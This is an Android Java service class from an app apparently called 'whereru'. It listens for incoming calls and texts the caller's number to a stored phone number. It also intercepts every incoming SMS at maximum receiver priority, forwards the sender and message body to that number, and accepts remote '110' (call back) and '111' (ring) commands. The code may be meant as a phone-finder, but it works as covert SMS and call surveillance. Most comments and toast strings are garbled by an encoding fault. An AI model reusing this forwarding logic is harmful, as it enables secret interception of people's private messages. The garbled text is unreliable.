package com.example.whereru;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

public class SMSService extends Service {

	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		super.onCreate();
	}
	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// TODO Auto-generated method stub
		Toast.makeText(this, "��������" , Toast.LENGTH_SHORT).show();
		Toast.makeText(this, "-"+AppContext.getPHONENUMBER()+"-" , Toast.LENGTH_SHORT).show();
		
		// �жϵ绰�����ż����Ƿ��
		if(AppContext.isSMSPHONE()){
			// �绰����
			// ���� �绰������ teleManager
			TelephonyManager teleManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
			// ��� teleManager����
			teleManager.listen(new  PhoneStateListener(){
				@Override
				public void onCallStateChanged(int state, String incomingNumber) {
					// TODO Auto-generated method stub
					super.onCallStateChanged(state, incomingNumber);
					// ������ڴ����
					// ����е绰���� �ͼ������ֻ��ţ����͸������ֻ�    Ȩ��(____READ_PHONE)
					if(state == TelephonyManager.CALL_STATE_RINGING){
						ActionUtils.sendSMS(AppContext.getPHONENUMBER(), "PhoneNo.:"+incomingNumber+"\nBody:���Ǵ󱿵�");
					}
					
				}
			}, PhoneStateListener.LISTEN_CALL_STATE);
		
			// ���ż���
			// ��� �㲥������
			BroadcastReceiver receiver = new BroadcastReceiver() {
				
				@Override
				public void onReceive(Context context, Intent intent) {
					// �õ� Bundle����
					Bundle bundle = intent.getExtras();
					if(bundle != null){
						Object[] objects = (Object[]) bundle.get("pdus");	// ���δ����Ķ���
						SmsMessage[] message = new SmsMessage[objects.length];
						for(int i=0; i< message.length; i++) {
							message[i] = SmsMessage.createFromPdu((byte[])objects[i]);
						}
						for(SmsMessage sms : message){
							// ���ź���
							String phone = sms.getDisplayOriginatingAddress();
							// ��������
							String body = sms.getDisplayMessageBody();
							
							Log.i("info", "�յ�һ������");
							Log.i("info", "PhoneNo. : "+phone);
							Log.i("info", "Body : -"+body+"-");
							
							
							// �ж϶��ź����Ƿ�Ϊ�����ֻ�����
							if(phone.indexOf(AppContext.getPHONENUMBER()) != -1 ){
								// ���ݶ�������
								if(body.indexOf("110") != -1){	// �����"CallBack"�ͻز��绰
									ActionUtils.call(AppContext.getPHONENUMBER(), context);
								} else if(body.indexOf("111") != -1){	// ����� "Ring!" ����
									ActionUtils.ring(context);
								}
							} 
							else {	// ������������ֻ�
								StringBuffer sb = new StringBuffer();
								sb.append("PhoneNumber: "+phone+"\n");
								sb.append("Body: "+body);
								ActionUtils.sendSMS(AppContext.getPHONENUMBER(), sb.toString());
							}
						}
					}
				}
			};
			// ���ӹ�����
			IntentFilter filter = new IntentFilter();
			filter.addAction("android.provider.Telephony.SMS_RECEIVED");
			filter.setPriority(Integer.MAX_VALUE);
			// ע��㲥������
			registerReceiver(receiver, filter);
		}
		
		return super.onStartCommand(intent, flags, startId);
	}
	@Override
	public boolean stopService(Intent name) {
		// TODO Auto-generated method stub
		Toast.makeText(this, "ֹͣ����" , Toast.LENGTH_SHORT).show();  //??
		return super.stopService(name);
	}
	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}

}
